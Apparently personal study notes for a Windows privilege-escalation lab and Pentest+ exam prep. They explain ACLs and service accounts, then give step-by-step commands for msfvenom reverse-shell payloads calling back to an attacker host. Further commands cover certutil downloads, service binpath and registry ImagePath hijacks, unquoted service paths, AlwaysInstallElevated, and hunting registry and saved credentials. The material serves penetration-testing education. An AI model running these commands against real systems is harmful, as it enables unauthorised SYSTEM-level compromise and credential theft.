**Gaining Administrator or SYSTEM user shell.**

All privesc are examples of **access control violations**
*Access control* and *user permissions* are intrinsically linked.

When understanding privesc in windows we need to undestand *how Windows handles permissions* is very important.

# Permissions in Windows
## User accounts
Administrator is by default at the time of installation.
## Service accounts
- Service accounts are responsible to run services in windows like in linux ssh and all in passwd file
- They dont have interative shell which cannt sign in into windows
- **SYSTEM account is a default service account which has the highest privileges of any local account in Windows.**
- Other default service accounts include *NETWORK SERVICE* and *LOCAL SERVICE*

## Groups
User can belong to multiple groups and groups can have multiple users.
Groups allow for easier access control to resource.
**Regular groups:** Administrators, Users ( have set list of members. )
**Pseudo groups:** Authenticated Users ( have a dynamic list of members which changes based on certain interactions. )

## Resources
There are different types of resources/objects.
- Files/Directories
- Registry entries
- Services

## ACLs & ACEs
permissions to access certain resource in windows is controlled by the access control list (ACL) for the resource. 

Each ACL is made up of zero or more access control entries (ACEs)

Each **ACEs** defines  the relationship between a principal (i.e a user, group) and certain access right
![](https://i.imgur.com/WKjvSXE.png)


# Gen rev shell
Payload:
`msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe`
Download in victim:
`certutil -urlcache http://xxx/file file`

Run in victim:
`file`
## RDP
If we have access to RDP or we can enable it , we cann add our low privileged user to the administrators group and then spawn an admin commannd prompt via GUI 
`net localgroup administrators <username> /add`

## Admin -> SYSTEM
We can use PsExec64 tool to do that from windows sysinternals 
`PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe`

## Tools
PowerUP(powershell script) and SharpUp(pre compiled) used to find privesc method fast
[PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
Usage:
```
-powershell -exec bypass 
-. .\PowerUp.ps1 (load script)
-Invoke-AllChecks
```

[[Post exploitation]]

[SharpUp](https://github.com/r3motecontrol/Ghoostpack-CompiledBinaries/blob/master/SharpUp.exe)

**Seatbelt** - Enum tool can run enum check. it provide further info to help in priv esc.

[Seatbelt](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)

**winPeas** is like linpeas for windows
hunts for privesc misconfigs.
[](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe)
Enable colors:
```
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

**accesschk.exe** Checks user access control rights. 
If you arent in RDP then it might create a problem cuz it shows a pop up in cmd. So use **Old version which has /accepteula option**

# Service Exploits
## Insecure Service Permissions
Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:
command:
`accesschk.exe /accepteula -uwcqv user daclsvc`

so here we have the permission to change the config (SERVICE_CHANGE_CONFIG)

listing info about service:
`sc qc daclsvc`

changing BINARY_PATH_NAME:
``sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""``

Now start the service:
`net start daclsvc`

## Unquoted service Path
Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME) and that the BINARY\_PATH\_NAME is unquoted and contains spaces.

`sc qc unquotedsvc`

![](https://i.imgur.com/9aUQogz.png)

Using accesschk.exe, note that the BUILTIN\\Users group is allowed to write to the C:\\Program Files\\Unquoted Path Service\\ directory:

`C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`
![](https://i.imgur.com/UX8uM4j.png)

Copy reverse shell to service path:
`copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`

So now start the service 
`net start unquotedsvc`

## Weak Registry Permissions
Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME).
`sc qc regsvc`

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\\INTERACTIVE" group (essentially all logged-on users):
`C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`
Overwrite the ImagePath registry key to point to the reverse.exe executable you created:
``reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f``
Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
``net start regsvc``

## Insecure Service Executables

`sc qc filepermsvc`
we can see it has SERVICE_START_NAME privileges

Check If BINARY_PATH_NAME is writable by everyone:
``C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"``

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:
`copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`

Start the service
`net start filepermsvc`

# Registry
## AutoRuns

Check autorun executables on system:
`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

`C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`

Putting shell in the PATH
`copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`

So if we connect again using rdp we will be able to get the reverse shell.

## AlwaysInstalledElevated

Query the registry for AlwaysInstallElevated keys:
`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
Note that both keys are set to 1 (0x1).

Generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`

To get the shell:
`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

# Passwords
## Registry
The registry can be searched for keys and values that contain the word "password":
`reg query HKLM /f password /t REG_SZ /s`

If you want to save some time, query this specific key to find admin AutoLogon credentials:

`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):

`winexe -U 'admin%password' //MACHINE_IP cmd.exe`


## Saved Creds
List any saved credentials:

`cmdkey /list`

get shell:
`runas /savecred /user:admin C:\PrivEsc\reverse.exe`


# Pentest+ 

## Cpasswd 
``` powershell
Get-DecryptedCpassword 
```

## Clear Test credentials in LDAP
- If ssl is not enabled on LDAP then creds are sent over the network in clear text.
- Use the inseecure LDAP Bind script to check for this in PowerShell.
``` powershell
.\ Query-InsecureLDAPBinds.ps1 -ComputerName dc1.corp,com -Hours 24
```
- You receive a CSV file as output showing which accounts are vulnerable 

## Kerbroasting 
- Any domain user account that has a service principal name (SPN) set can have a service ticker (TGS).
- Ticket can be requested by any user in the domain and allows for offline cracking of the service account plaintext password.

## Credentials in LSASS
- Local security authrotiy subsystem service
- process in Windows that  enforces the security policy of the system
- verifies users when logging on to a computer or server 
- Performs password changes 
- Creates access token(i.e kerberos).

## SAM Database 
- Security Account Manager is a database file that stores the user password in windows as LM hash or NTLM hash

- File is used to authenticate local users and remote users
- Passwords can be cracked offline if SAM file is stolen
- 'Hashdump' command in msf.

## DLL hijacking
Dynamic link library is used as malicaios same as library or lib.so files needed in linux programs to execute so we can replace with malicaious dll.

## Exploitable
Malicaios exe.
## Keylogger
## Schedule Tasks
